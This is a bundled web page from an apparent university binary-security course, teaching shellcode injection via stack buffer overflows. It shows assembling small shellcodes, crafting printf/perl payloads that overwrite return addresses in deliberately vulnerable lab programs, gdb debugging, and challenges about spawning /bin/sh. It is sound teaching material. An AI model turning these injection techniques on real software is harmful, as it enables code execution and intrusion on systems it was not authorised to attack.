"use strict";(self.webpackChunkbinary_security=self.webpackChunkbinary_security||[]).push([[4457],{474:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/stack_buffer-0b96391d4eed9498228a407c79df21e7.png"},5680:(e,n,t)=>{t.d(n,{xA:()=>c,yg:()=>u});var a=t(6540);function l(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){l(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function r(e,n){if(null==e)return{};var t,a,l=function(e,n){if(null==e)return{};var t,a,l={},o=Object.keys(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||(l[t]=e[t]);return l}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(l[t]=e[t])}return l}var s=a.createContext({}),d=function(e){var n=a.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},c=function(e){var n=d(e.components);return a.createElement(s.Provider,{value:n},e.children)},f="mdxType",h={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},p=a.forwardRef((function(e,n){var t=e.components,l=e.mdxType,o=e.originalType,s=e.parentName,c=r(e,["components","mdxType","originalType","parentName"]),f=d(t),p=l,u=f["".concat(s,".").concat(p)]||f[p]||h[p]||o;return t?a.createElement(u,i(i({ref:n},c),{},{components:t})):a.createElement(u,i({ref:n},c))}));function u(e,n){var t=arguments,l=n&&n.mdxType;if("string"==typeof e||l){var o=t.length,i=new Array(o);i[0]=p;var r={};for(var s in n)hasOwnProperty.call(n,s)&&(r[s]=n[s]);r.originalType=e,r[f]="string"==typeof e?e:l,i[1]=r;for(var d=2;d<o;d++)i[d]=t[d];return a.createElement.apply(null,i)}return a.createElement.apply(null,t)}p.displayName="MDXCreateElement"},6324:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>s,contentTitle:()=>i,default:()=>h,frontMatter:()=>o,metadata:()=>r,toc:()=>d});var a=t(8168),l=(t(6540),t(5680));const o={},i="Shellcodes",r={unversionedId:"Exploitation Techniques/Shellcodes/Reading/README",id:"Exploitation Techniques/Shellcodes/Reading/README",title:"Shellcodes",description:"Introduction",source:"@site/docs/Exploitation Techniques/Shellcodes/Reading/README.md",sourceDirName:"Exploitation Techniques/Shellcodes/Reading",slug:"/Exploitation Techniques/Shellcodes/Reading/",permalink:"/binary-security/Exploitation Techniques/Shellcodes/Reading/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"sidebar",previous:{title:"Shellcodes",permalink:"/binary-security/Exploitation Techniques/Shellcodes/"},next:{title:"Shellcodes Advanced",permalink:"/binary-security/Exploitation Techniques/Shellcodes Advanced/"}},s={},d=[{value:"Introduction",id:"introduction",level:2},{value:"Stack Buffer Overflow Recap",id:"stack-buffer-overflow-recap",level:3},{value:"Code Injection",id:"code-injection",level:3},{value:"Develop",id:"develop",level:4},{value:"Inject",id:"inject",level:4},{value:"Trigger",id:"trigger",level:4},{value:"&quot;Shellcodes&quot;",id:"shellcodes-1",level:3},{value:"Tutorials",id:"tutorials",level:2},{value:"01. Tutorial: Generating Machine Code",id:"01-tutorial-generating-machine-code",level:3},{value:"02. Tutorial: Inspecting Machine Code",id:"02-tutorial-inspecting-machine-code",level:3},{value:"03. Tutorial: Feeding Machine Code to a Program",id:"03-tutorial-feeding-machine-code-to-a-program",level:3},{value:"04. Tutorial: &quot;Hello, world!&quot; Shellcode",id:"04-tutorial-hello-world-shellcode",level:3},{value:"05. Tutorial: Debugging Shellcodes",id:"05-tutorial-debugging-shellcodes",level:3},{value:"Challenges",id:"challenges",level:2},{value:"06. Challenge: /bin/sh Shellcode",id:"06-challenge-binsh-shellcode",level:3},{value:"07. Challenge: Shellcode on Stack",id:"07-challenge-shellcode-on-stack",level:3},{value:"08. Challenge: Shellcode after Saved Return Address",id:"08-challenge-shellcode-after-saved-return-address",level:3},{value:"09. Challenge: Shellcode after Saved Return Address - No Leak",id:"09-challenge-shellcode-after-saved-return-address---no-leak",level:3},{value:"10. Challenge: Shellcode as Command-Line Argument",id:"10-challenge-shellcode-as-command-line-argument",level:3},{value:"11. Challenge: Shellcode in the Environment",id:"11-challenge-shellcode-in-the-environment",level:3},{value:"Further Reading",id:"further-reading",level:2},{value:"Resources",id:"resources",level:2}],c={toc:d},f="wrapper";function h({components:e,...n}){return(0,l.yg)(f,(0,a.A)({},c,n,{components:e,mdxType:"MDXLayout"}),(0,l.yg)("h1",{id:"shellcodes"},"Shellcodes"),(0,l.yg)("h2",{id:"introduction"},"Introduction"),(0,l.yg)("h3",{id:"stack-buffer-overflow-recap"},"Stack Buffer Overflow Recap"),(0,l.yg)("p",null,"In the last session, we studied what an attacker can do to a program with a stack-buffer-overflow vulnerability: fill up the legitimately reserved space with junk, then overwrite the saved-return value with an address of their choosing.\nAfter the vulnerable function's execution ends, its final ",(0,l.yg)("inlineCode",{parentName:"p"},"ret")," will place the attacker's chosen address into the ",(0,l.yg)("inlineCode",{parentName:"p"},"eip"),"/",(0,l.yg)("inlineCode",{parentName:"p"},"rip")," and execution will continue from there."),(0,l.yg)("p",null,(0,l.yg)("img",{alt:"Stack Buffer",src:t(474).A,width:"791",height:"416"})),(0,l.yg)("p",null,"The above scenario limits the attacker to the functionality already present in the vulnerable program.\nIf an attacker desires to spawn a shell, but no shell-spawning code is already present - tough luck!\nIn this session we will start studying a method of overcoming this limitation: code injection."),(0,l.yg)("h3",{id:"code-injection"},"Code Injection"),(0,l.yg)("p",null,"If the code we want to execute is not present in the target program, we'll simply add it ourselves!\nWe will implement our desired functionality in machine code, inject (which is just a fancy word for \"write\") it into the target process' memory, then force execution to jump to the beginning of our code.\nThese steps can be succinctly summarized as: develop, inject, trigger."),(0,l.yg)("h4",{id:"develop"},"Develop"),(0,l.yg)("p",null,"First, we need to implement our desired functionality.\nOur goal is to obtain ",(0,l.yg)("em",{parentName:"p"},"something")," that can be placed directly into the memory space of a running process and be executed;\nso it cannot be text representing code in C, Python, Java etc.\nIt must be ",(0,l.yg)("em",{parentName:"p"},"machine code"),".\nThis might seem a very difficult task, but we'll simply use the tools we usually employ when writing code that we intend to run;\nin particular, we will rely on the assembler: we write ASM code to do what we want, then assemble it to obtain a string of machine code bytes."),(0,l.yg)("h4",{id:"inject"},"Inject"),(0,l.yg)("p",null,"Once we have our string of machine code bytes, we need it to be present in the memory space of the target process.\nThis means the program must read some input (with a ",(0,l.yg)("inlineCode",{parentName:"p"},"gets"),", ",(0,l.yg)("inlineCode",{parentName:"p"},"fgets"),", ",(0,l.yg)("inlineCode",{parentName:"p"},"fscanf"),", ",(0,l.yg)("inlineCode",{parentName:"p"},"read")," etc.).\nHowever, if we can ",(0,l.yg)("em",{parentName:"p"},"launch")," the program, we can also place our code in the environment or inside a command-line argument;\neven if a program doesn't use these, the loader still places them in its address space."),(0,l.yg)("h4",{id:"trigger"},"Trigger"),(0,l.yg)("p",null,"After having placed our code inside the memory space of the target process, we need to force execution to jump at its beginning.\nWe already know how to do this, by means of a stack-buffer-overflow, which we studied in the previous session."),(0,l.yg)("h3",{id:"shellcodes-1"},'"Shellcodes"'),(0,l.yg)("p",null,"Usually, the end-goal of an attacker is to force the program to spawn a shell, thus gaining unlimited access.\nThis can be achieved by injecting machine code that triggers an ",(0,l.yg)("inlineCode",{parentName:"p"},'execve("/bin/sh", ["/bin/sh", NULL], NULL)'),' system call, hence the name "shellcode".\nHowever, this label is also used for any piece of injected code, even if it does not spawn a shell.'),(0,l.yg)("h2",{id:"tutorials"},"Tutorials"),(0,l.yg)("h3",{id:"01-tutorial-generating-machine-code"},"01. Tutorial: Generating Machine Code"),(0,l.yg)("p",null,"To address the first step of our code injection technique, we will start with a simple example: we want to force the program to end cleanly with an exit code of 42;\nmore precisely we want to execute an ",(0,l.yg)("inlineCode",{parentName:"p"},"exit(42)")," system call."),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-asm"},"BITS 64\n    mov rdi, 42\n    mov rax, 60\n    syscall\n")),(0,l.yg)("p",null,(0,l.yg)("a",{parentName:"p",href:"http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/"},"Linux Syscall Table")),(0,l.yg)("p",null,"We can then use ",(0,l.yg)("inlineCode",{parentName:"p"},"nasm")," to obtain a file with machine code:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"nasm exit_shellcode.nasm -o exit_shellcode.bin\n")),(0,l.yg)("p",null,(0,l.yg)("strong",{parentName:"p"},"NOTE:")," ",(0,l.yg)("inlineCode",{parentName:"p"},"exit_shellcode.bin")," is not an ELF:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"$ file exit_shellcode.bin\nexit_shellcode.bin: data\n")),(0,l.yg)("p",null,"It is not an executable file at all, but simply contains a raw string of machine code bytes.\nYou can see that it is very, very small:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"$ wc --bytes exit_shellcode.bin\n12 exit_shellcode.bin\n")),(0,l.yg)("h3",{id:"02-tutorial-inspecting-machine-code"},"02. Tutorial: Inspecting Machine Code"),(0,l.yg)("p",null,"We would also like to be able to do the reverse of this: given a file that contains a raw string of machine code bytes, translate it back into readable assembly.\nThis is useful to check that our assembly process was correct, as well as for analyzing files that we did not create."),(0,l.yg)("p",null,"In ",(0,l.yg)("a",{parentName:"p",href:"../../../Binary%20Analysis/Exploration%20Tools/Reading"},"the first session"),", we learned to disassemble using ",(0,l.yg)("inlineCode",{parentName:"p"},"objdump"),".\nBy default, ",(0,l.yg)("inlineCode",{parentName:"p"},"objdump")," expects a proper ",(0,l.yg)("inlineCode",{parentName:"p"},"ELF")," executable and complains about our raw file:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"$ objdump -d -M intel exit_shellcode.bin\nobjdump: exit_shellcode.bin: file format not recognized\n")),(0,l.yg)("p",null,"We need to use the following command:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"$ objdump -D -b binary -m i386:x86-64 -M intel exit_shellcode.bin\n\ntest.bin:     file format binary\n\n\nDisassembly of section .data:\n\n0000000000000000 <.data>:\n   0:   48 c7 c0 ff ff ff ff    mov    rax,0xffffffffffffffff\n   7:   bf 2a 00 00 00          mov    edi,0x2a\n   c:   b8 3c 00 00 00          mov    eax,0x3c\n  11:   0f 05                   syscall\n")),(0,l.yg)("ul",null,(0,l.yg)("li",{parentName:"ul"},(0,l.yg)("inlineCode",{parentName:"li"},"-D"),": disassemble all, not only text/code zones.\nIn our case this means disassemble the whole file."),(0,l.yg)("li",{parentName:"ul"},(0,l.yg)("inlineCode",{parentName:"li"},"-b binary"),": treat the file as not having a specific object/executable format (such as ",(0,l.yg)("inlineCode",{parentName:"li"},"ELF"),", ",(0,l.yg)("inlineCode",{parentName:"li"},"COFF"),", ",(0,l.yg)("inlineCode",{parentName:"li"},"Mach-O")," or ",(0,l.yg)("inlineCode",{parentName:"li"},"PE"),")."),(0,l.yg)("li",{parentName:"ul"},(0,l.yg)("inlineCode",{parentName:"li"},"-m i386:86-64"),": the machine code inside the binary file is i386 (x86), 64 bits (usually, ",(0,l.yg)("inlineCode",{parentName:"li"},"objdump")," gets this information from the ELF header)."),(0,l.yg)("li",{parentName:"ul"},(0,l.yg)("inlineCode",{parentName:"li"},"-M intel"),": display ASM using Intel assembly syntax, as opposed to AT&T assembly syntax.")),(0,l.yg)("p",null,"We can also use a tool like ",(0,l.yg)("inlineCode",{parentName:"p"},"xxd")," or ",(0,l.yg)("inlineCode",{parentName:"p"},"hexdump")," to inspect the byte values in the file, without disassembling:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"$ xxd exit_shellcode.bin\n00000000: 48c7 c0ff ffff ffbf 2a00 0000 b83c 0000  H.......*....<..\n00000010: 000f 05                                  ...\n")),(0,l.yg)("h3",{id:"03-tutorial-feeding-machine-code-to-a-program"},"03. Tutorial: Feeding Machine Code to a Program"),(0,l.yg)("p",null,"Now that we know how to obtain a bytestring of machine code from an assembly program, it's time to move on to the next step: injection.\nThe simplest way is to redirect the ",(0,l.yg)("inlineCode",{parentName:"p"},"stdin")," of the target program to the file containing our raw machine code."),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"./vuln < exit_shellcode.bin\n")),(0,l.yg)("p",null,"However, we might want to freely edit the payload directly on the command-line (for example, if the program reads some other stuff).\nThe way to do this is to use another tool, like the shell itself, to transform hexadecimal notation into binary data:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"$ printf '\\x4b\\x80\\x04\\x08'\nK\ufffd\x04\n")),(0,l.yg)("p",null,"Again, we can use a tool like ",(0,l.yg)("inlineCode",{parentName:"p"},"xxd")," for the reverse operation, to verify that the binary data comes out as intended:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"$ printf '\\x4b\\x80\\x04\\x08' | xxd -p\n4b800408\n")),(0,l.yg)("p",null,"If our machine code is contained in a file, we can use ",(0,l.yg)("inlineCode",{parentName:"p"},"hexdump")," to obtain an escaped hexadecimal representation of its contents:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},'$ hexdump -v -e \'"\\\\" 1/1 "x%02x"\' exit_shellcode.bin\n\\x48\\xc7\\xc0\\xff\\xff\\xff\\xff\\xbf\\x2a\\x00\\x00\\x00\\xb8\\x3c\\x00\\x00\\x00\\x0f\\x05\n')),(0,l.yg)("p",null,"Which we can then combine with some other input"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"printf '1\\x48\\xc7\\xc0\\xff\\xff\\xff\\xff\\xbf\\x2a\\x00\\x00\\x00\\xb8\\x3c\\x00\\x00\\x00\\x0f\\x05' | ./vuln2\n")),(0,l.yg)("p",null,"Or we can do this directly:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"printf '1'$(hexdump -v -e '\"\\\\\" 1/1 \"x%02x\"' exit_shellcode.bin) | ./vuln2\n")),(0,l.yg)("p",null,"We can then verify that the program did indeed exit with code 42:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"$ echo $?\n42\n")),(0,l.yg)("h3",{id:"04-tutorial-hello-world-shellcode"},'04. Tutorial: "Hello, world!" Shellcode'),(0,l.yg)("p",null,"Our aim now is to develop a shellcode that prints ",(0,l.yg)("inlineCode",{parentName:"p"},'"Hello, world!\\n"')," to standard output, then inject it into ",(0,l.yg)("inlineCode",{parentName:"p"},"vuln")," and trigger its execution."),(0,l.yg)("p",null,"We start by writing a shellcode that does a ",(0,l.yg)("inlineCode",{parentName:"p"},'write(1, "Hello, world!\\n", 14)')," system call, by writing the string on to the stack such that the stack pointer points to the beginning of the string."),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-asm"},'; Write "Hello, world!\\n" to the standard output.\nBITS 64\n    ; We can\'t push 64 bit constants, but we can push 64 bit registers.\n    mov rbx, `orld!\\n`\n    push rbx\n    mov rbx, `Hello, w`\n    push rbx\n    mov rsi, rsp\n    mov rdx, 14\n    mov rdi, 1\n    mov rax, 1\n    syscall\n')),(0,l.yg)("p",null,"This is just one way to do it and there are other possible approaches to it."),(0,l.yg)("p",null,"We then assemble our snippet to get a string of machine code bytes (the ",(0,l.yg)("inlineCode",{parentName:"p"},"Makefile")," provided already does this)."),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"nasm hello_shellcode.nasm -o hello_shellcode.bin\n")),(0,l.yg)("p",null,"Our vulnerable program first reads 128 bytes into a global buffer (line 8):"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-c"},"read(0, machine_code, 128);\n")),(0,l.yg)("p",null,"Our shellcode-injecting payload needs to consist of the shellcode itself and some junk to pad the payload length to 128.\nFirst, we need to determine the shellcode size in bytes, then we use a tool like python to generate the string:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},'$ wc -c hello_shellcode.bin\n42 hello_shellcode.bin\n\n$ perl -e "print \\"$(hexdump -v -e \'"\\\\" 1/1 "x%02x"\' ./hello_shellcode.bin)\\" . \\"A\\" x (128 - 42)"\n')),(0,l.yg)("p",null,"We then move on to the second part of our exploit, in which we hijack control flow by exploiting a stack-buffer-overflow in which 128 bytes are read into a 16 byte buffer."),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-c"},"char buf[16];\n...\nread(0, buf, 128);\n")),(0,l.yg)("p",null,"All we need to do is to pad the legitimately reserved space until the saved return address, then overwrite it with the address of ",(0,l.yg)("inlineCode",{parentName:"p"},"machine_code"),".\nThus we will probably need 16 + 8 (the saved ",(0,l.yg)("inlineCode",{parentName:"p"},"rbp"),") bytes of padding, but remember that we can't rely on the layout we see in C and must inspect the binary:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"$ objdump -d -M intel ./vuln\n...\n0000000000401126 <main>:\n  401126:       55                      push   rbp\n  401127:       48 89 e5                mov    rbp,rsp\n  40112a:       48 83 ec 10             sub    rsp,0x10    <---- Here we see that there are, indeed, just 16 bytes reserved on this stack frame\n...\n")),(0,l.yg)("p",null,"We then determine the address of the global buffer which holds our code and craft our second payload (remember to reverse the bytes because our systems are little endian):"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},'$ nm ./vuln | grep machine_code\n0000000000404060 T machine_code\n\n$ perl -e \'print "A" x (16 + 8) . "\\x60\\x40\\x40\\x00\\x00\\x00\\x00\\x00"\'\n')),(0,l.yg)("p",null,"Now all we need to do is concatenate our two payloads:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},'$ perl -e "print \\"$(hexdump -v -e \'"\\\\" 1/1 "x%02x"\' ./hello_shellcode.bin)\\" . \\"A\\" x (128 - 42) . \\"A\\" x (16 + 8) . \\"\\x60\\x40\\x40\\x00\\x00\\x00\\x00\\x00\\"" | ./vuln\nHello, world!\n[1]    53760 done                              perl -e  |\n       53762 segmentation fault (core dumped)  ./vuln\n')),(0,l.yg)("p",null,"As you can see, even with simple exploits, payloads quickly become unwieldy.\nOur advice is to make use of a script in a language like python.\nThere is one such script example in the task directory."),(0,l.yg)("p",null,'Even though we succeeded in printing our message, the program then ended abruptly with a "Segmentation fault" message.\nPause for a second to figure out why that is.'),(0,l.yg)("p",null,"Because we hijacked normal control flow, the program does not reach the end of the ",(0,l.yg)("inlineCode",{parentName:"p"},"main")," function to terminate gracefully, but instead continues to attempt to execute instructions from the ",(0,l.yg)("inlineCode",{parentName:"p"},"machine_code")," global var.\nWe can help the program exit gracefully by extending our shellcode to also perform an ",(0,l.yg)("inlineCode",{parentName:"p"},"exit(0)")," syscall after the ",(0,l.yg)("inlineCode",{parentName:"p"},"write"),".\nRemember to check the size of the new shellcode and update the padding accordingly!"),(0,l.yg)("h3",{id:"05-tutorial-debugging-shellcodes"},"05. Tutorial: Debugging Shellcodes"),(0,l.yg)("p",null,"How can we ",(0,l.yg)("strong",{parentName:"p"},"know")," that our shellcode worked properly?\nSometimes its external effects are not immediately visible;\nif it involves any system calls, we can make use of ",(0,l.yg)("inlineCode",{parentName:"p"},"strace"),":"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},'$ printf \'1\'$(hexdump -v -e \'"\\\\" 1/1 "x%02x"\' exit_shellcode.bin) | strace ./vuln2\nexecve("./vuln2", ["./vuln2"], 0x7ffdb027a9d0 /* 77 vars */) = 0\n....\nexit(42)                                = ?\n+++ exited with 42 +++\n')),(0,l.yg)("p",null,"A more productive approach is to use ",(0,l.yg)("inlineCode",{parentName:"p"},"gdb")," to inspect the execution of the shellcode step by step.\nLoad the program, break on the shellcode address, feed it the input and run:"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"$ gdb ./vuln\nReading symbols from ./vuln...\ngdb-peda$ b *main+56\nBreakpoint 1 at 0x40115e: file vuln.c, line 11.\ngdb-peda$ r < payload\nStarting program: /home/mihai/gits/sss-exploit-internal/sessions/07-shellcodes/activities/04-tutorial-hello-world-shellcode/src/vuln < payload\n[----------------------------------registers-----------------------------------]\nRAX: 0x0\nRBX: 0x401160 (<__libc_csu_init>:       endbr64)\nRCX: 0x7ffff7eb6052 (<read+18>: cmp    rax,0xfffffffffffff000)\nRDX: 0x80\nRSI: 0x7fffffffd370 ('A' <repeats 24 times>, \"`@@\")\nRDI: 0x0\nRBP: 0x4141414141414141 ('AAAAAAAA')\nRSP: 0x7fffffffd388 --\x3e 0x404060 --\x3e 0xa21646c726fbb48\nRIP: 0x40115e (<main+56>:       ret)\nR8 : 0x0\nR9 : 0x7ffff7fdc070 (<_dl_fini>:        endbr64)\nR10: 0xfffffffffffff4ac\nR11: 0x246\nR12: 0x401040 (<_start>:        endbr64)\nR13: 0x0\nR14: 0x0\nR15: 0x0\nEFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x401153 <main+45>:  call   0x401030 <read@plt>\n   0x401158 <main+50>:  mov    eax,0x0\n   0x40115d <main+55>:  leave\n=> 0x40115e <main+56>:  ret\n   0x40115f:    nop\n   0x401160 <__libc_csu_init>:  endbr64\n   0x401164 <__libc_csu_init+4>:        push   r15\n   0x401166 <__libc_csu_init+6>:        lea    r15,[rip+0x2c93]        # 0x403e00\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffd388 --\x3e 0x404060 --\x3e 0xa21646c726fbb48\n0008| 0x7fffffffd390 --\x3e 0x7fffffffd40a --\x3e 0xd478000000000000\n0016| 0x7fffffffd398 --\x3e 0x1f7fca000\n0024| 0x7fffffffd3a0 --\x3e 0x401126 (<main>:      push   rbp)\n0032| 0x7fffffffd3a8 --\x3e 0x7fffffffd859 --\x3e 0x54bcc0a1225a8900\n0040| 0x7fffffffd3b0 --\x3e 0x401160 (<__libc_csu_init>:   endbr64)\n0048| 0x7fffffffd3b8 --\x3e 0x352575cde5bb22d8\n0056| 0x7fffffffd3c0 --\x3e 0x401040 (<_start>:    endbr64)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0x000000000040115e in main () at vuln.c:11\n11      }\ngdb-peda$ si\n[----------------------------------registers-----------------------------------]\nRAX: 0x0\nRBX: 0x401160 (<__libc_csu_init>:       endbr64)\nRCX: 0x7ffff7eb6052 (<read+18>: cmp    rax,0xfffffffffffff000)\nRDX: 0x80\nRSI: 0x7fffffffd370 ('A' <repeats 24 times>, \"`@@\")\nRDI: 0x0\nRBP: 0x4141414141414141 ('AAAAAAAA')\nRSP: 0x7fffffffd390 --\x3e 0x7fffffffd40a --\x3e 0xd478000000000000\nRIP: 0x404060 --\x3e 0xa21646c726fbb48\nR8 : 0x0\nR9 : 0x7ffff7fdc070 (<_dl_fini>:        endbr64)\nR10: 0xfffffffffffff4ac\nR11: 0x246\nR12: 0x401040 (<_start>:        endbr64)\nR13: 0x0\nR14: 0x0\nR15: 0x0\nEFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x40405a:    add    BYTE PTR [rax],al\n   0x40405c:    add    BYTE PTR [rax],al\n   0x40405e:    add    BYTE PTR [rax],al\n=> 0x404060 <machine_code>:     movabs rbx,0xa21646c726f\n   0x40406a <machine_code+10>:  push   rbx\n   0x40406b <machine_code+11>:  movabs rbx,0x77202c6f6c6c6548\n   0x404075 <machine_code+21>:  push   rbx\n   0x404076 <machine_code+22>:  mov    rsi,rsp\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffd390 --\x3e 0x7fffffffd40a --\x3e 0xd478000000000000\n0008| 0x7fffffffd398 --\x3e 0x1f7fca000\n0016| 0x7fffffffd3a0 --\x3e 0x401126 (<main>:      push   rbp)\n0024| 0x7fffffffd3a8 --\x3e 0x7fffffffd859 --\x3e 0x54bcc0a1225a8900\n0032| 0x7fffffffd3b0 --\x3e 0x401160 (<__libc_csu_init>:   endbr64)\n0040| 0x7fffffffd3b8 --\x3e 0x352575cde5bb22d8\n0048| 0x7fffffffd3c0 --\x3e 0x401040 (<_start>:    endbr64)\n0056| 0x7fffffffd3c8 --\x3e 0x0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0000000000404060 in machine_code ()\ngdb-peda$\n")),(0,l.yg)("h2",{id:"challenges"},"Challenges"),(0,l.yg)("h3",{id:"06-challenge-binsh-shellcode"},"06. Challenge: /bin/sh Shellcode"),(0,l.yg)("p",null,"You are given a piece of assembly code that attempts to spawn a shell with the aid of the ",(0,l.yg)("inlineCode",{parentName:"p"},"execve")," syscall.\nHowever, the given code is buggy and it will not work.\nYour task is to figure out what's wrong with it and fix it."),(0,l.yg)("h3",{id:"07-challenge-shellcode-on-stack"},"07. Challenge: Shellcode on Stack"),(0,l.yg)("p",null,"Up until now we have injected code into some memory area, then used a stack-buffer-overflow vulnerability to overwrite a saved return address and hijack control flow.\nIf we think about it, the legitimately reserved buffer space on the stack ",(0,l.yg)("em",{parentName:"p"},"is")," a memory area and we could perform our attack using a single read: the overflowing one."),(0,l.yg)("p",null,"So our payload will consist of the bytes in our shellcode, then some junk to pad the rest of the space to the saved return, then the address of the buffer itself:"),(0,l.yg)("p",null,(0,l.yg)("img",{alt:"Shellcode on Stack",src:t(6812).A,width:"791",height:"416"})),(0,l.yg)("p",null,"Now that our shellcode is written on the stack, things become a little harder.\nDue to several factors (such as the fact that environment variables and command-line arguments are placed by the loader on the stack), it is difficult to predict the address at which any value will be placed on the stack.\nFor now, the binary will generously print it for us."),(0,l.yg)("p",null,"You can observe the volatility of the stack by changing how you launch the program (remember that the path of the binary is considered a command-line argument, namely ",(0,l.yg)("inlineCode",{parentName:"p"},"argv[0]")," so it too gets placed on the stack, thus things change depending on what exact relative or absolute path we use):"),(0,l.yg)("pre",null,(0,l.yg)("code",{parentName:"pre",className:"language-console"},"$ ./vuln\n0x7fffffffd5d0\n$ ../07-challenge-shellcode-on-stack/vuln\n0x7fffffffd550\n$ ./vuln asdf\n0x7fffffffd5c0\n$ ./vuln asdfqwer\n0x7fffffffd5c0\n$ ./vuln asdfqwerasdfqwer\n0x7fffffffd5b0\n$ ./vuln asdf qwer\n0x7fffffffd5b0\n$ FOO=bar ./vuln\n0x7fffffffd5c0\n")),(0,l.yg)("h3",{id:"08-challenge-shellcode-after-saved-return-address"},"08. Challenge: Shellcode after Saved Return Address"),(0,l.yg)("p",null,"In the previous challenge, we placed our shellcode on the stack, in the space between the overflown buffer's beginning and the saved return address.\nHowever, we could switch things up and place the shellcode in the area ",(0,l.yg)("strong",{parentName:"p"},"after")," the saved return address.\nThis might be useful when the stack buffer is too short to hold our payload."),(0,l.yg)("p",null,"So our payload will consist of padding junk from the beginning of the buffer to the saved return, the address of the next stack portion, then the bytes of our shellcode."),(0,l.yg)("p",null,(0,l.yg)("img",{alt:"Shellcode Above",src:t(6680).A,width:"791",height:"416"})),(0,l.yg)("p",null,"To recap: given a stack-buffer-overflow vulnerability we can not only hijack control flow, but also place a shellcode on the stack using the buggy read.\nThere are two regions where we can do this:"),(0,l.yg)("ul",null,(0,l.yg)("li",{parentName:"ul"},"between the buffer start and the saved return address:\nThe number of bytes we can write here is determined by ",(0,l.yg)("strong",{parentName:"li"},"how much space was allocated on the stack"),"."),(0,l.yg)("li",{parentName:"ul"},"after the saved return address:\nThe number of bytes we can write here is determined by ",(0,l.yg)("strong",{parentName:"li"},"how many bytes are read"),".")),(0,l.yg)("p",null,"If any of these regions is too small, we can try the other one.\nIf both of them are too small, that's a problem.\nHowever, note that shellcodes are usually tiny."),(0,l.yg)("h3",{id:"09-challenge-shellcode-after-saved-return-address---no-leak"},"09. Challenge: Shellcode after Saved Return Address - No Leak"),(0,l.yg)("p",null,"This is the same as the previous challenge, only this time the executable does not conveniently leak the buffer's address.\nSo you will have to deal with the differences between running a binary inside and outside of ",(0,l.yg)("inlineCode",{parentName:"p"},"gdb")," to precisely determine the necessary address, then jump to it."),(0,l.yg)("h3",{id:"10-challenge-shellcode-as-command-line-argument"},"10. Challenge: Shellcode as Command-Line Argument"),(0,l.yg)("p",null,"As mentioned in the introduction, reading from standard input or from a file isn't the only way to place content inside the memory space of a process.\nIf we can launch the executable, we can modify its environment or command-line arguments.\nThe fact that a program might not use its arguments or environment is irrelevant, the loader can't know this, so it places them in the address space anyway."),(0,l.yg)("p",null,"Take the ",(0,l.yg)("inlineCode",{parentName:"p"},"/bin/sh")," shellcode and feed it to the program as a command-line argument, then exploit the  to actually run it."),(0,l.yg)("h3",{id:"11-challenge-shellcode-in-the-environment"},"11. Challenge: Shellcode in the Environment"),(0,l.yg)("p",null,"Take the ",(0,l.yg)("inlineCode",{parentName:"p"},"/bin/sh")," shellcode 